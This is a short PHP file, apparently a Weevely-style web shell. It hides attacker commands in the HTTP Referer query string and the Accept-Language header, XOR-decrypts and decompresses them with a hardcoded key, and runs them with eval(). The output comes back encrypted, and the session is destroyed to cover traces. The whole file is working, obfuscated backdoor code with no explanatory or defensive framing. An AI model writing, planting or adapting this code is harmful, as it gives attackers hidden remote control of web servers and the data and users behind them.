<?php $kh = "3481";
$kf = "9d7b";
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0;$i < $l;) {
        for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
            $o.= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
    $u = parse_url($rr);
    parse_str($u["query"], $q);
    $q = array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
    if ($q && $m) {
        @session_start();
        $s = & $_SESSION;
        $ss = "substr";
        $sl = "strtolower";
        $i = $m[1][0] . $m[1][1];
        $h = $sl($ss(md5($i . $kh), 0, 3));
        $f = $sl($ss(md5($i . $kf), 0, 3));
        $p = "";
        for ($z = 1;$z < count($m[1]);$z++) $p.= $q[$m[2][$z]];
        if (strpos($p, $h) === 0) {
            $s[$i] = "";
            $p = $ss($p, 3);
        }
        if (array_key_exists($i, $s)) {
            $s[$i].= $p;
            $e = strpos($s[$i], $f);
            if ($e) {
                $k = $kh . $kf;
                ob_start();
                eval(@gzuncompress(@x(base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(x(gzcompress($o), $k));
                print ("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
};
?>
